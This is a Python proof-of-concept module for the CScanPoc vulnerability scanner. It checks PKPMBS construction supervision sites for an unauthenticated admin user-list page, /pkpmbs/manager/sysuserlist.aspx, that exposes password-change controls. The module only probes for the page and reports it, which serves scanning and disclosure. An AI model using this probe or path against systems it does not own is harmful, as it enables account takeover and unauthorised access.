# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'pkpmbs_0017' # 平台漏洞编号，留空
    name = 'PKPMBS工程质量监督站信息管理系统可修改任意会员密码等其他信息' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '2015-09-20'  # 漏洞公布时间
    desc = '''
        PKPMBS工程质量监督站信息管理系统可修改任意会员密码等其他信息
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0121058' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'pkpmbs'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'pkpmbs_0017' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url=arg+"/pkpmbs/manager/sysuserlist.aspx"
            code,head,res,errcode,_=hh.http(url)
            if code==200 and  "javascript:role(" in res and 'javascript:changepwd(' in res:  
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()